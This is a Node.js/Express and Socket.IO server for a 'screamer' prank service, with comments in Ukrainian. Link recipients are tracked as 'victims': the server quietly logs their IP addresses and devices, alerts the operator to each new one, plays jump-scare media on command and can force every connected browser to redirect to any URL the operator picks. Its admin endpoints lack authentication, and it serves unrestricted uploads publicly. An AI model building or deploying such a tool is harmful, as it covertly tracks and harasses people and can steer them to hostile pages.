const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

app.use(express.static('public'));
app.use(express.json());

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
// Переконуємось, що папка для завантажень існує
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// Налаштування Multer (збереження файлів)
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOAD_DIR);
    },
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname);
        const name = `${Date.now()}-${uuidv4()}${ext}`;
        cb(null, name);
    }
});
const upload = multer({ storage });

app.get('/', (req, res) => res.redirect('/admin.html'));

const sessions = {}; // Головний об'єкт сесій
const activeVictims = {};

// --- Helpers ---
function fileToPublicUrl(filename) {
    return `/uploads/${filename}`;
}

function addFilesToSessionArray(arr, incomingFiles, type) {
    incomingFiles.forEach(f => {
        arr.push({
            filename: f.filename,
            url: fileToPublicUrl(f.filename),
            originalname: f.originalname,
            uploadedAt: new Date().toLocaleString('uk-UA')
        });
    });
}

function parseDevice(ua) {
    if (!ua) return "Unknown";
    if (ua.includes('Android')) return "📱 Android";
    if (ua.includes('iPhone')) return "📱 iPhone";
    if (ua.includes('Windows')) return "💻 Windows PC";
    if (ua.includes('Macintosh')) return "💻 Mac";
    return "📱 Device";
}

function deleteFileFromDisk(filename) {
    return new Promise((resolve, reject) => {
        const p = path.join(UPLOAD_DIR, filename);
        fs.unlink(p, (err) => {
            if (err && err.code !== 'ENOENT') return reject(err);
            resolve();
        });
    });
}

// --- Створення сесії через посилання ---
app.post('/create', (req, res) => {
    const { sound = '', image = '' } = req.body;
    const id = uuidv4();
    const createdAt = new Date().toLocaleString('uk-UA');
    const now = Date.now();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const shortIp = ip.split(',')[0].trim();

    sessions[id] = {
        sound: sound.trim(),
        image: image.trim(),
        createdAt,
        lastActiveAt: now,
        totalVictims: 0,
        creator: {
            ip: shortIp,
            device: parseDevice(userAgent),
            userAgent: userAgent.substring(0, 100),
            createdTimestamp: now
        },
        imagesFiles: [],
        soundsFiles: [],
    };

    res.json({ id, createdAt });
});

// --- Створення сесії із завантаженням файлів ---
app.post('/create-upload', upload.fields([{ name: 'images', maxCount: 10 }, { name: 'sounds', maxCount: 10 }]), (req, res) => {
    const id = uuidv4();
    const createdAt = new Date().toLocaleString('uk-UA');
    const now = Date.now();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const shortIp = ip.split(',')[0].trim();

    const images = (req.files && req.files['images']) || [];
    const sounds = (req.files && req.files['sounds']) || [];

    // Перевірка кількості
    if (images.length > 10 || sounds.length > 10) {
        [...images, ...sounds].forEach(f => {
            fs.unlinkSync(path.join(UPLOAD_DIR, f.filename));
        });
        return res.status(400).json({ error: 'Maximum 10 images and 10 sounds allowed' });
    }

    sessions[id] = {
        sound: '',
        image: '',
        createdAt,
        lastActiveAt: now,
        totalVictims: 0,
        creator: {
            ip: shortIp,
            device: parseDevice(userAgent),
            userAgent: userAgent.substring(0, 100),
            createdTimestamp: now
        },
        imagesFiles: [],
        soundsFiles: [],
    };

    addFilesToSessionArray(sessions[id].imagesFiles, images, 'image');
    addFilesToSessionArray(sessions[id].soundsFiles, sounds, 'sound');

    res.json({ id, createdAt });
});

// Оновлення медіа (Посилання)
app.post('/update-session/:id', (req, res) => {
    const id = req.params.id;
    const { sound, image } = req.body;

    if (!sessions[id]) {
        return res.status(404).json({ error: 'Session not found' });
    }

    if (sound !== undefined && sound !== '') sessions[id].sound = sound.trim();
    if (image !== undefined && image !== '') sessions[id].image = image.trim();

    sessions[id].lastActiveAt = Date.now();

    const currentSound = (sessions[id].soundsFiles && sessions[id].soundsFiles.length) ? sessions[id].soundsFiles[sessions[id].soundsFiles.length - 1].url : (sessions[id].sound || '');
    const currentImage = (sessions[id].imagesFiles && sessions[id].imagesFiles.length) ? sessions[id].imagesFiles[sessions[id].imagesFiles.length - 1].url : (sessions[id].image || '');

    io.to(id).emit('update-media', {
        sound: currentSound,
        image: currentImage
    });

    res.json({ success: true, session: sessions[id] });
});

// Додати зображення у сесію
app.post('/session/:id/upload-images', upload.array('images', 10), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) {
        (req.files || []).forEach(f => fs.unlinkSync(path.join(UPLOAD_DIR, f.filename)));
        return res.status(404).json({ error: 'Session not found' });
    }
    const incoming = req.files || [];
    const currentCount = sessions[id].imagesFiles.length;
    if (currentCount + incoming.length > 10) {
        incoming.forEach(f => fs.unlinkSync(path.join(UPLOAD_DIR, f.filename)));
        return res.status(400).json({ error: 'Images limit exceeded (max 10)' });
    }
    addFilesToSessionArray(sessions[id].imagesFiles, incoming, 'image');
    sessions[id].lastActiveAt = Date.now();

    const currentImage = sessions[id].imagesFiles.length ? sessions[id].imagesFiles[sessions[id].imagesFiles.length - 1].url : sessions[id].image || '';
    io.to(id).emit('update-media', {
        sound: (sessions[id].soundsFiles.length ? sessions[id].soundsFiles[sessions[id].soundsFiles.length - 1].url : sessions[id].sound || ''),
        image: currentImage
    });

    res.json({ success: true, imagesFiles: sessions[id].imagesFiles });
});

// Додати звуки у сесію
app.post('/session/:id/upload-sounds', upload.array('sounds', 10), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) {
        (req.files || []).forEach(f => fs.unlinkSync(path.join(UPLOAD_DIR, f.filename)));
        return res.status(404).json({ error: 'Session not found' });
    }
    const incoming = req.files || [];
    const currentCount = sessions[id].soundsFiles.length;
    if (currentCount + incoming.length > 10) {
        incoming.forEach(f => fs.unlinkSync(path.join(UPLOAD_DIR, f.filename)));
        return res.status(400).json({ error: 'Sounds limit exceeded (max 10)' });
    }
    addFilesToSessionArray(sessions[id].soundsFiles, incoming, 'sound');
    sessions[id].lastActiveAt = Date.now();

    const currentSound = sessions[id].soundsFiles.length ? sessions[id].soundsFiles[sessions[id].soundsFiles.length - 1].url : sessions[id].sound || '';
    io.to(id).emit('update-media', {
        sound: currentSound,
        image: (sessions[id].imagesFiles.length ? sessions[id].imagesFiles[sessions[id].imagesFiles.length - 1].url : sessions[id].image || '')
    });

    res.json({ success: true, soundsFiles: sessions[id].soundsFiles });
});

// Видалення файлу з сесії
app.delete('/session/:id/file', async (req, res) => {
    const id = req.params.id;
    const { filename, type } = req.body;
    if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
    if (!filename) return res.status(400).json({ error: 'filename required' });

    const arr = (type === 'sound') ? sessions[id].soundsFiles : sessions[id].imagesFiles;
    if (!arr) return res.status(400).json({ error: 'Invalid type' });

    const idx = arr.findIndex(f => f.filename === filename);
    if (idx === -1) return res.status(404).json({ error: 'File not found in session' });

    const [removed] = arr.splice(idx, 1);

    try {
        await deleteFileFromDisk(removed.filename);
    } catch (e) {
        console.error('Error deleting file:', e);
    }

    sessions[id].lastActiveAt = Date.now();

    const currentSound = sessions[id].soundsFiles.length ? sessions[id].soundsFiles[sessions[id].soundsFiles.length - 1].url : (sessions[id].sound || '');
    const currentImage = sessions[id].imagesFiles.length ? sessions[id].imagesFiles[sessions[id].imagesFiles.length - 1].url : (sessions[id].image || '');
    io.to(id).emit('update-media', { sound: currentSound, image: currentImage });

    res.json({ success: true });
});

// Отримати дані однієї сесії
app.get('/session/:id', (req, res) => {
    const session = sessions[req.params.id];
    if (session) {
        res.json({
            sound: session.sound || '',
            image: session.image || '',
            createdAt: session.createdAt,
            imagesFiles: session.imagesFiles || [],
            soundsFiles: session.soundsFiles || []
        });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// Список всіх сесій (для моніторингу)
app.get('/sessions', (req, res) => {
    const result = Object.keys(sessions).map(id => {
        const s = sessions[id];
        const onlineCount = Object.values(activeVictims).filter(v => v.roomId === id).length;
        return {
            id,
            createdAt: s.createdAt,
            lastActiveAt: s.lastActiveAt,
            totalVictims: s.totalVictims,
            onlineCount,
            sound: s.sound || '',
            image: s.image || '',
            imagesFilesCount: s.imagesFiles ? s.imagesFiles.length : 0,
            soundsFilesCount: s.soundsFiles ? s.soundsFiles.length : 0,
            creator: s.creator || { ip: 'Unknown', device: 'Unknown', userAgent: 'Unknown' }
        };
    });
    result.sort((a, b) => b.lastActiveAt - a.lastActiveAt);
    res.json(result);
});

// Видалення сесії
app.delete('/session/:id', async (req, res) => {
    const id = req.params.id;
    if (sessions[id]) {
        const toDelete = [
            ...(sessions[id].imagesFiles || []).map(f => f.filename),
            ...(sessions[id].soundsFiles || []).map(f => f.filename)
        ];
        for (const fn of toDelete) {
            try {
                await deleteFileFromDisk(fn);
            } catch (e) {
                console.error('Error deleting file during session removal', fn, e);
            }
        }
        delete sessions[id];
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// Перевірка статусу (для admin.html)
app.post('/check-status', (req, res) => {
    const { ids } = req.body;
    const result = ids.map(id => {
        const count = Object.values(activeVictims).filter(v => v.roomId === id).length;
        const sess = sessions[id];
        return {
            id,
            active: count > 0 && sess,
            count,
            date: sess ? sess.createdAt : null
        };
    });
    result.sort((a, b) => b.active - a.active);
    res.json(result);
});

// --- SOCKET.IO (ЗВИЧАЙНИЙ І БОМБАРДУВАННЯ) ---
io.on('connection', (socket) => {

    // 1. Вхід Адміна
    socket.on('join-room-admin', (roomId) => {
        socket.join(roomId);
        sendVictimList(roomId);
    });

    // 2. БОМБАРДУВАННЯ (РЕДІРЕКТ)
    socket.on('trigger-redirect', (data) => {
        const { roomId, url } = data;
        // Відправляємо всім у кімнаті команду на перехід
        io.to(roomId).emit('force-redirect', { url });
    });

    // 3. Вхід Жертви
    socket.on('join-room-victim', (data) => {
        const roomId = data.roomId;
        socket.join(roomId);

        const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

        activeVictims[socket.id] = {
            socketId: socket.id,
            roomId,
            device: parseDevice(data.userAgent),
            ip,
            joinedAt: new Date().toLocaleTimeString()
        };

        if (sessions[roomId]) {
            sessions[roomId].totalVictims += 1;
            sessions[roomId].lastActiveAt = Date.now();
        }

        sendVictimList(roomId);
        io.to(roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });

        // Якщо в сесії є файли, відправляємо їх жертві одразу
        if (sessions[roomId]) {
            const currentSound = sessions[roomId].soundsFiles && sessions[roomId].soundsFiles.length ? sessions[roomId].soundsFiles[sessions[roomId].soundsFiles.length - 1].url : (sessions[roomId].sound || '');
            const currentImage = sessions[roomId].imagesFiles && sessions[roomId].imagesFiles.length ? sessions[roomId].imagesFiles[sessions[roomId].imagesFiles.length - 1].url : (sessions[roomId].image || '');
            socket.emit('update-media', {
                sound: currentSound,
                image: currentImage
            });
        }
    });

    // 4. Скрімер
    socket.on('trigger-scare', (roomId) => {
        io.to(roomId).emit('play-sound');
    });

    // 5. Відключення
    socket.on('disconnect', () => {
        const victim = activeVictims[socket.id];
        if (victim) {
            const roomId = victim.roomId;
            delete activeVictims[socket.id];
            sendVictimList(roomId);
        }
    });
});

function sendVictimList(roomId) {
    const users = Object.values(activeVictims).filter(v => v.roomId === roomId);
    io.to(roomId).emit('update-victim-list', users);
}

const PORT = 3000;
http.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin: /admin.html | Watch: /watch.html | Victim: /victim.html?id=...`);
});
